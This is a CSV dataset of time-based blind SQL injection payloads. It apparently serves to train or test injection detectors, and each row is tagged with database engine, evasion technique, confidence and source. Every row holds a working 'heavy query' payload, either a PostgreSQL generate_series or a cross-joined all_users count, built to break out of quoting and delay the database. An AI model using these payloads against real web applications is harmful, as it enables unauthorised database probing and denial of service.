payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1%"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 1321 = 1321",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""uydm"" = ""uydm",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'xkxi' like 'xkxi",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""dros"" = ""dros",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""lynw"" like ""lynw",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""kssm"" = ""kssm",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'swfj' like 'swfj",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'qgrt' = 'qgrt",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'mnbg' like 'mnbg",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'tnvm' like 'tnvm",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'ojkd' = 'ojkd",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""ymss"" = ""ymss",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'esma' like 'esma",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'gmbd' = 'gmbd",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'ptou' = 'ptou",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 5215 = 5215",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""rzja"" like ""rzja",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""xhvo"" = ""xhvo",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'uorw' like 'uorw",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'ewwi' = 'ewwi",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'dfsj' = 'dfsj",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'obax' like 'obax",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ireg' like 'ireg",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""snwx"" like ""snwx",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) # fnck",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ugtw"" = ""ugtw",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1, ( select ( case when ( 3902 = 3902 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1/ ( select 0 from dual ) end ) from dual )",heavy_query,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 3508 = 3508",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'bmzj' like 'bmzj",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""jydy"" like ""jydy",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'oskf' like 'oskf",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'hxcq' = 'hxcq",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'juhi' like 'juhi",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""qyew"" = ""qyew",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'istb' = 'istb",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'zdkn' = 'zdkn",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ""ihbe"" like ""ihbe",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ""kngx"" like ""kngx",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup"" = ""vcup",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""wdbg"" like ""wdbg",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'hpbt' = 'hpbt",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'xfmq' = 'xfmq",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'hhbh' = 'hhbh",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lqpd' = 'lqpd",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""epxq"" like ""epxq",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""sfbc"" = ""sfbc",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 2160 = 2160",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'dhwt' = 'dhwt",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) -- gqkk",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 8048 = 8048",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'csmu' = 'csmu",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh' = 'vhvh",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'qpdu' = 'qpdu",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'cqrp' = 'cqrp",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # zwck",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""soyg"" = ""soyg",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"( select ( case when ( 1343 = 1343 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1343 end ) from dual )",heavy_query,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'msol' = 'msol",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'pufu' like 'pufu",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ksxz"" = ""ksxz",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'hfxu' like 'hfxu",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'ccsb' = 'ccsb",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""cdai"" = ""cdai",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( '%' = '",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( '%' = '",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ||'",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
